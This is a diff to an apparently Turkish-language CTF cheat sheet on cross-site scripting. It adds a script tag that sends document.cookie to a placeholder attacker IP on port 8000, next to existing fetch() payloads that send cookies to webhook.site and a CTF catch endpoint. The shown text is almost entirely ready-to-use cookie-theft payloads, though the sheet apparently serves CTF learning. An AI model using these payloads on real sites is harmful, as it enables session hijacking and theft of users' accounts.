@@ -104,9 +104,12 @@ fetch("https://webhook.site/ac2a452b-4f51-4762-82c5-6d0c6ecf6bdc?data=" + docume
 <script>
 fetch('https://ctf-platform.com/catch?flag=' + document.cookie);
 </script>
-```
+
+
+<script>var i=new Image(); i.src="http://SENIN_VPN_IP_ADRESIN:8000/?cookie="+document.cookie;</script>
 ⚠️ Not: HTTPOnly cookie’ler JavaScript ile okunamaz.
 
+```
 ---
 
 ### 2. LocalStorage / SessionStorage Çalma
